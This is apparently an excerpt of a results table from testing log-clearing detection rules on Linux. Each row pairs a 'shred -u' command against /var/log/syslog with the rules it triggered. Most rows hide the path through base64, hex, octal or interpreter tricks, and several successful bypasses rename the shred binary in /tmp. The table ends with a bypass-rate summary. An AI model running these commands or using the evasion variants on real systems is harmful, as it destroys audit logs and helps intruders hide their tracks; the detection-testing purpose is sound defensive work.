+242,shred -u /var/log/0x7f000001,Clear_Linux_Logs_attack242.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+243,shred -u /var/log/2130706433,Clear_Linux_Logs_attack243.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+244,shred -u /var/log/0x7F000001,Clear_Linux_Logs_attack244.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+245,shred -u /var/log/3232235521,Clear_Linux_Logs_attack245.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+246,shred -u /var/log/0xC0A80001,Clear_Linux_Logs_attack246.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+247,shred -u /var/log/030052000001,Clear_Linux_Logs_attack247.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+248,shred -u /var/log/0b01111111000000000000000000000001,Clear_Linux_Logs_attack248.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+249,shred -u /var/log/0x00007F000001,Clear_Linux_Logs_attack249.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+250,shred -u /var/log/\x2f\x76\x61\x72\x2f\x6c\x6f\x67\x2f\x73\x79\x73\x6c\x6f\x67,Clear_Linux_Logs_attack250.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+251,shred -u /var/log/$((2130706433)),Clear_Linux_Logs_attack251.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+252,shred -u /var/log/$'\x2fvar\x2flog\x2fsyslog',Clear_Linux_Logs_attack252.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+254,shred -u /var/log/$(printf '%s' '/var/log/syslog'),Clear_Linux_Logs_attack254.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+255,shred -u $(echo '/var/log/syslog'),Clear_Linux_Logs_attack255.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+256,shred -u $(echo -n '/var/log/syslog'),Clear_Linux_Logs_attack256.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+258,shred -u $(echo '/var'/'log'/'syslog'),Clear_Linux_Logs_attack258.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+260,shred -u $(eval echo /var/log/syslog),Clear_Linux_Logs_attack260.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+261,"shred -u ""$(printf '/%s/%s/%s' var log syslog)""",Clear_Linux_Logs_attack261.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+262,shred -u $(echo /var/log/$(basename /var/log/syslog)),Clear_Linux_Logs_attack262.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+266,shred -u $(readlink -f /var/../var/log/syslog),Clear_Linux_Logs_attack266.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+267,"shred -u $(python3 -c ""print('/var/log/' + 'syslog')"")",Clear_Linux_Logs_attack267.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+268,"shred -u $(perl -e ""print '/var/log/syslog'"")",Clear_Linux_Logs_attack268.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+270,shred -u $(echo c3hyZWQgLXUgL3Zhci9sb2cvc3lzbG9n | base64 -d | cut -d ' ' -f3),Clear_Linux_Logs_attack270.log,Trigger: Clear Linux Logs,Decode Base64 Encoded Text | File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+273,shred -u $(echo -e '\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147'),Clear_Linux_Logs_attack273.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+274,shred -u $(printf '\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147'),Clear_Linux_Logs_attack274.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+275,shred -u $(echo $'\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147'),Clear_Linux_Logs_attack275.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+276,"shred -u $(awk 'BEGIN{printf ""/var/log/syslog""}')",Clear_Linux_Logs_attack276.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+277,"shred -u $(perl -e 'print ""/var/log/syslog""')",Clear_Linux_Logs_attack277.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+282,shred -u $(printf '/%s/%s/%s' var log syslog),Clear_Linux_Logs_attack282.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+283,shred -u $(echo /var/log/{syslog}),Clear_Linux_Logs_attack283.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+289,shred -u $(echo 2f7661722f6c6f672f7379736c6f67 | xxd -r -p),Clear_Linux_Logs_attack289.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+290,shred -u $(echo L3Zhci9sb2cvc3lzbG9n | base64 -d),Clear_Linux_Logs_attack290.log,Trigger: Clear Linux Logs,Decode Base64 Encoded Text | File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+292,shred -u $(echo $((0x2f766172)) | sed 's/.*/\/var\/log\/syslog/'),Clear_Linux_Logs_attack292.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+293,shred -u $(printf '/var/%s/%s' log syslog),Clear_Linux_Logs_attack293.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+294,shred -u $(echo /var/log/syslog | iconv -f utf-8 -t utf-8),Clear_Linux_Logs_attack294.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+295,"shred -u $(printf '%s' ""$(echo /var/log/syslog)"")",Clear_Linux_Logs_attack295.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+299,shred -u $(echo /var/log/syslog | awk '{print}'),Clear_Linux_Logs_attack299.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+318,cp /usr/bin/shred /run/shm/sh; /run/shm/sh -u /var/log/syslog,Clear_Linux_Logs_attack318.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
+321,cp /usr/bin/shred /tmp/shred99; /tmp/shred99 -u /var/log/syslog,Clear_Linux_Logs_attack321.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+334,cp /usr/bin/shred /tmp/sh0; /tmp/sh0 -u /var/log/syslog,Clear_Linux_Logs_attack334.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+356,cp /usr/bin/shred /tmp/shr; /tmp/shr -u /var/log/syslog,Clear_Linux_Logs_attack356.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+,,,,
+,,,,
+=== SUMMARY REPORT ===,,,,
+Calculation Base (Source: Detection Results),,,,
+Total Meaningful Logs (Denominator),210,,,
+Triggered Target (Detections),195,,,
+Bypass Logs (Numerator),15,,,
+BYPASS RATE (Bypass/Meaningful),15 / 210 (7.14%),,,
